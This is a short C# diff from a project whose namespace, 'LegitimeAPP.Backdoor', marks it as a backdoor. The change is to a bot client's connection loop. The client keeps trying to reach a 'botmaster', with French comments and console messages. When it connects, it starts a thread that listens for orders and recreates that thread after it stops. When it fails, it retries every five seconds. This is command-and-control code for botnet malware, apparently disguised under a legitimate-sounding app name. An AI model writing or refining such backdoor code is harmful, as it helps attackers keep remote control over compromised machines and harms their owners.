@@ -124,6 +124,7 @@ namespace LegitimeAPP.Backdoor {
             }
         }
 
+
         private void MakeConnectionRequest() {
 
             while (true) {
@@ -138,15 +139,23 @@ namespace LegitimeAPP.Backdoor {
                 Console.WriteLine("La connexion avec le botmaster est un succès") ; 
 
                 // On démarre le Thread lorsque la connexion est une réussite
+
+
+                // Reset le Thread dans le cas ou il a déjà été lancé
+                if (_FollowingOrders.ThreadState == ThreadState.Stopped)
+                {  
+                    _FollowingOrders = new Thread(ListeningOrder) ; 
+                } 
+
+                
                 _FollowingOrders.Start() ; 
                 
-                _FollowingOrders.Join() ; 
+                _FollowingOrders.Join() ;
 
-                //_ConnectionRequests.Interrupt() ;
-                
             } catch( Exception _) {
 
-              //  Console.WriteLine(ex.Message) ; 
+              //  Console.WriteLine(ex.Message) ;       
+ 
                 Console.WriteLine("La connexion au BotMaster à échoué... Nouvelle tentative dans 5 secondes  ") ;
                 }
                 Thread.Sleep(5000) ;  
